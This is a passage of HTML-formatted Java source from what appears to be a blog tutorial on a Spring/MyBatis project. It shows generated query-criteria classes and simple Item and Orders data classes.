            addCriterion(&lt;/span&gt;&quot;id not in&quot;, values, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdBetween(Integer value1, Integer value2) {
            addCriterion(&lt;/span&gt;&quot;id between&quot;, value1, value2, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdNotBetween(Integer value1, Integer value2) {
            addCriterion(&lt;/span&gt;&quot;id not between&quot;, value1, value2, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameIsNull() {
            addCriterion(&lt;/span&gt;&quot;name is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;name is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;name =&quot;, value, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameNotEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;name &amp;lt;&amp;gt;&quot;, value, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameGreaterThan(String value) {
            addCriterion(&lt;/span&gt;&quot;name &amp;gt;&quot;, value, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameGreaterThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;name &amp;gt;=&quot;, value, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameLessThan(String value) {
            addCriterion(&lt;/span&gt;&quot;name &amp;lt;&quot;, value, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameLessThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;name &amp;lt;=&quot;, value, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameLike(String value) {
            addCriterion(&lt;/span&gt;&quot;name like&quot;, value, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameNotLike(String value) {
            addCriterion(&lt;/span&gt;&quot;name not like&quot;, value, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andNameIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;name in&quot;, values, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andNameNotIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;name not in&quot;, values, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;name between&quot;, value1, value2, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andNameNotBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;name not between&quot;, value1, value2, &quot;name&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceIsNull() {
            addCriterion(&lt;/span&gt;&quot;price is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;price is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceEqualTo(Float value) {
            addCriterion(&lt;/span&gt;&quot;price =&quot;, value, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceNotEqualTo(Float value) {
            addCriterion(&lt;/span&gt;&quot;price &amp;lt;&amp;gt;&quot;, value, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceGreaterThan(Float value) {
            addCriterion(&lt;/span&gt;&quot;price &amp;gt;&quot;, value, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceGreaterThanOrEqualTo(Float value) {
            addCriterion(&lt;/span&gt;&quot;price &amp;gt;=&quot;, value, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceLessThan(Float value) {
            addCriterion(&lt;/span&gt;&quot;price &amp;lt;&quot;, value, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceLessThanOrEqualTo(Float value) {
            addCriterion(&lt;/span&gt;&quot;price &amp;lt;=&quot;, value, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andPriceIn(List&amp;lt;Float&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;price in&quot;, values, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andPriceNotIn(List&amp;lt;Float&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;price not in&quot;, values, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceBetween(Float value1, Float value2) {
            addCriterion(&lt;/span&gt;&quot;price between&quot;, value1, value2, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPriceNotBetween(Float value1, Float value2) {
            addCriterion(&lt;/span&gt;&quot;price not between&quot;, value1, value2, &quot;price&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicIsNull() {
            addCriterion(&lt;/span&gt;&quot;pic is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;pic is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;pic =&quot;, value, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicNotEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;pic &amp;lt;&amp;gt;&quot;, value, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicGreaterThan(String value) {
            addCriterion(&lt;/span&gt;&quot;pic &amp;gt;&quot;, value, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicGreaterThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;pic &amp;gt;=&quot;, value, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicLessThan(String value) {
            addCriterion(&lt;/span&gt;&quot;pic &amp;lt;&quot;, value, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicLessThanOrEqualTo(String value) {
            addCriterion(&lt;/span&gt;&quot;pic &amp;lt;=&quot;, value, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicLike(String value) {
            addCriterion(&lt;/span&gt;&quot;pic like&quot;, value, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicNotLike(String value) {
            addCriterion(&lt;/span&gt;&quot;pic not like&quot;, value, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andPicIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;pic in&quot;, values, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andPicNotIn(List&amp;lt;String&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;pic not in&quot;, values, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;pic between&quot;, value1, value2, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andPicNotBetween(String value1, String value2) {
            addCriterion(&lt;/span&gt;&quot;pic not between&quot;, value1, value2, &quot;pic&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeIsNull() {
            addCriterion(&lt;/span&gt;&quot;createtime is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;createtime is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeEqualTo(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime =&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeNotEqualTo(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;lt;&amp;gt;&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeGreaterThan(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;gt;&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeGreaterThanOrEqualTo(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;gt;=&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeLessThan(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;lt;&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeLessThanOrEqualTo(Date value) {
            addCriterion(&lt;/span&gt;&quot;createtime &amp;lt;=&quot;, value, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andCreatetimeIn(List&amp;lt;Date&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;createtime in&quot;, values, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andCreatetimeNotIn(List&amp;lt;Date&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;createtime not in&quot;, values, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeBetween(Date value1, Date value2) {
            addCriterion(&lt;/span&gt;&quot;createtime between&quot;, value1, value2, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andCreatetimeNotBetween(Date value1, Date value2) {
            addCriterion(&lt;/span&gt;&quot;createtime not between&quot;, value1, value2, &quot;createtime&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Criteria &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; GeneratedCriteria {

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criteria() {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Criterion {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String condition;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object value;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object secondValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; noValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; singleValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; betweenValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; listValue;

        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String typeHandler;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getCondition() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; condition;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object getValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; value;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object getSecondValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; secondValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isNoValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; noValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isSingleValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; singleValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isBetweenValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; betweenValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isListValue() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; listValue;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getTypeHandler() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; typeHandler;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition) {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.condition =&lt;span&gt; condition;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.typeHandler = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.noValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value, String typeHandler) {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.condition =&lt;span&gt; condition;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.typeHandler =&lt;span&gt; typeHandler;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value &lt;span&gt;instanceof&lt;/span&gt; List&amp;lt;?&amp;gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.listValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.singleValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;(condition, value, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value, Object secondValue, String typeHandler) {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.condition =&lt;span&gt; condition;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.value =&lt;span&gt; value;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.secondValue =&lt;span&gt; secondValue;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.typeHandler =&lt;span&gt; typeHandler;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.betweenValue = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criterion(String condition, Object value, Object secondValue) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;(condition, value, secondValue, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;ItemQueryVO.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ItemQueryVO {

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Item item;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; List&amp;lt;Item&amp;gt;&lt;span&gt; itemList;
    
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;private Item[] itemList;&lt;/span&gt;
    
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Item getItem() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; item;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setItem(Item item) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.item =&lt;span&gt; item;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Item&amp;gt;&lt;span&gt; getItemList() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; itemList;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setItemList(List&amp;lt;Item&amp;gt;&lt;span&gt; itemList) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.itemList =&lt;span&gt; itemList;
    }

    
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;Orders.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Date;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Orders {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer id;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer userId;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String number;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Date createtime;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String note;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Integer getId() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; id;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setId(Integer id) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.id =&lt;span&gt; id;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Integer getUserId() {
